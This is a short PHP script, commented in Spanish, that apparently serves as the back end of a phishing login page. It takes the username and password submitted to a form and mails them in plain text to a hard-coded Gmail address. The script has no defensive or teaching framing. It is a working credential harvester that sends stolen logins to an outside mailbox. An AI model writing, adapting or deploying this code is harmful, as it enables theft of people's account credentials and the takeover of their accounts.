<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibir datos del formulario
    $nombre_usuario = $_POST['username'];
    $contraseña = $_POST['password'];
    
    // Correo electrónico de destino
    $destinatario = 'luigiialexismarquez019@gmail.com';
    
    // Asunto del correo electrónico
    $asunto = 'Inicio de sesión - Información de usuario';
    
    // Contenido del correo electrónico
    $mensaje = "Nombre de usuario: " . $nombre_usuario . "\r\n";
    $mensaje .= "Contraseña: " . $contraseña;
    
    // Enviar correo electrónico
    if (mail($destinatario, $asunto, $mensaje)) {
        echo "Correo electrónico enviado exitosamente.";
    } else {
        echo "Error al enviar el correo electrónico.";
    }
}
?>
